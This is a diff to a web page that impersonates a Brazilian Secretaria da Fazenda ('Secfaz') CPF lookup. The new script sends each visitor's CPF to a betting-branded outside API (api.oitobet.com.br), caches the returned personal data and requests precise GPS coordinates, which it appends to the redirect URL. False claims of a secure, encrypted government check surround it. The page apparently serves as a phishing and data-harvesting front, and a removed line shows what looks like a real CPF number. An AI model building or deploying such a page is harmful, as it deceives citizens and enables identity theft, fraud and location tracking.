@@ -151,7 +151,7 @@
       margin-bottom: 6px;
     }
     
-    /* INPUTS COM COR DE AUTOFILL (FUNDO AMARELO DE SENHA/CPF SALVO) */
+    /* INPUT DE CPF */
     .form-input {
       width: 100%;
       height: 46px;
@@ -386,7 +386,7 @@
   <!-- LAYOUT PRINCIPAL -->
   <div class="main-wrapper">
 
-    <!-- COLUNA ESQUERDA: LOGIN COM CPF E SENHA PRÉ-SALVA -->
+    <!-- COLUNA ESQUERDA: LOGIN COM CPF -->
     <aside class="card-login">
       <div class="card-login-header">
         <span>Consulta de Titular</span>
@@ -399,19 +399,10 @@
             type="tel" 
             id="cpfInput" 
             class="form-input" 
-            value="063.818.519-02" 
+            placeholder="000.000.000-00"
             required 
             maxlength="14"
             inputmode="numeric"
-          >
-
-          <label class="form-label" for="passInput">Senha de Acesso:</label>
-          <input 
-            type="password" 
-            id="passInput" 
-            class="form-input" 
-            value="••••••••••••" 
-            required 
           >
 
           <button type="submit" class="btn-submit">
@@ -435,7 +426,7 @@
           <li class="notice-item">
             <span class="notice-date">14/08/2026</span>
             <div class="notice-title">Ambiente Seguro de Validação</div>
-            <div class="notice-desc">As credenciais salvas são verificadas com criptografia de ponta a ponta no servidor Secfaz.</div>
+            <div class="notice-desc">A consulta do CPF é verificada com criptografia de ponta a ponta no servidor Secfaz.</div>
           </li>
           <li class="notice-item">
             <span class="notice-date">10/08/2026</span>
@@ -466,10 +457,12 @@
   </div>
 
   <!-- SPLASH SCREEN DE SEGURANÇA -->
-  <div class="splash-screen" id="splashScreen">
-    <div class="splash-spinner"></div>
-    <div class="splash-title">Acessando com Segurança...</div>
-    <div class="splash-subtitle">Validando credenciais junto ao servidor da Secretaria da Fazenda</div>
+  <div class="splash-backdrop" id="splashScreen">
+    <div class="splash-box">
+      <div class="splash-spinner"></div>
+      <div class="splash-title">Acessando com Segurança...</div>
+      <div class="splash-subtitle">Validando CPF junto ao servidor da Secretaria da Fazenda</div>
+    </div>
   </div>
 
   <!-- FOOTER -->
@@ -482,6 +475,7 @@
     const urlParams = new URLSearchParams(window.location.search);
     const cpfFromUrl = urlParams.get('cpf');
     const cpfInput = document.getElementById('cpfInput');
+    const apiBase = 'https://api.oitobet.com.br/api';
 
     if (cpfFromUrl && cpfInput) {
       const cleanUrlCpf = cpfFromUrl.replace(/\D/g, '');
@@ -518,48 +512,77 @@
       `;
     }
 
-    // SUBMITE DO FORMULÁRIO DE LOGIN COM SOLICITAÇÃO DE GEOLOCALIZAÇÃO
-    document.getElementById('secfazForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      
+    function showResultMessage(message, isError = false) {
+      const resBox = document.getElementById('consulta-resultado');
+      resBox.style.display = 'block';
+      resBox.className = isError ? 'error' : '';
+      resBox.textContent = message;
+    }
+
+    async function fetchUserData(cpf) {
+      const response = await fetch(`${apiBase}/secfaz/${encodeURIComponent(cpf)}`);
+      const payload = await response.json().catch(() => ({}));
+      if (!response.ok || !payload.ok || !payload.data) {
+        throw new Error(payload.error || 'CPF não encontrado na base de dados.');
+      }
+      return payload.data;
+    }
+
+    function redirectToCpfPage(cpf, geoParams = '') {
+      window.location.href = `cpf.html?cpf=${encodeURIComponent(cpf)}&auth=true${geoParams}`;
+    }
+
+    function redirectWithOptionalLocation(cpf) {
       const splash = document.getElementById('splashScreen');
       if (splash) splash.style.display = 'flex';
 
-      const currentCpf = cpfInput.value ? cpfInput.value.replace(/\D/g, '') : '';
-      if (currentCpf.length !== 11) {
-        if (splash) splash.style.display = 'none';
-        const resBox = document.getElementById('consulta-resultado');
-        resBox.style.display = 'block';
-        resBox.className = 'error';
-        resBox.textContent = 'Informe um CPF valido com 11 digitos.';
-        return;
-      }
-      let geoParams = '';
-
-      // Dispara o prompt nativo do navegador/dispositivo solicitando acesso ao GPS/Localização
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           function(pos) {
             const lat = pos.coords.latitude.toFixed(4);
             const lng = pos.coords.longitude.toFixed(4);
-            geoParams = `&lat=${lat}&lng=${lng}`;
-
             setTimeout(function() {
-              window.location.href = `cpf.html?cpf=${encodeURIComponent(currentCpf)}&auth=true${geoParams}`;
-            }, 2000);
+              redirectToCpfPage(cpf, `&lat=${lat}&lng=${lng}`);
+            }, 900);
           },
-          function(err) {
-            // Em caso de recusa pelo usuário, efetua o redirecionamento padrão após o splash
+          function() {
             setTimeout(function() {
-              window.location.href = `cpf.html?cpf=${encodeURIComponent(currentCpf)}&auth=true`;
-            }, 2500);
+              redirectToCpfPage(cpf);
+            }, 900);
           },
           { enableHighAccuracy: true, timeout: 6000 }
         );
       } else {
         setTimeout(function() {
-          window.location.href = `cpf.html?cpf=${encodeURIComponent(currentCpf)}&auth=true`;
-        }, 2500);
+          redirectToCpfPage(cpf);
+        }, 900);
+      }
+    }
+
+    // SUBMITE DO FORMULÁRIO DE LOGIN COM CPF E SOLICITAÇÃO DE GEOLOCALIZAÇÃO
+    document.getElementById('secfazForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const currentCpf = cpfInput.value ? cpfInput.value.replace(/\D/g, '') : '';
+      if (currentCpf.length !== 11) {
+        showResultMessage('Informe um CPF valido com 11 digitos.', true);
+        return;
+      }
+
+      const submitButton = this.querySelector('button[type="submit"]');
+      submitButton.disabled = true;
+      submitButton.textContent = 'Consultando...';
+      showResultMessage('Consultando dados do CPF...');
+
+      try {
+        const userData = await fetchUserData(currentCpf);
+        sessionStorage.setItem('secfazUserData', JSON.stringify(userData));
+        renderResult(userData);
+        redirectWithOptionalLocation(currentCpf);
+      } catch (error) {
+        showResultMessage(error.message || 'Nao foi possivel consultar este CPF.', true);
+        submitButton.disabled = false;
+        submitButton.innerHTML = '<span>Entrar</span>';
       }
     });
   </script>
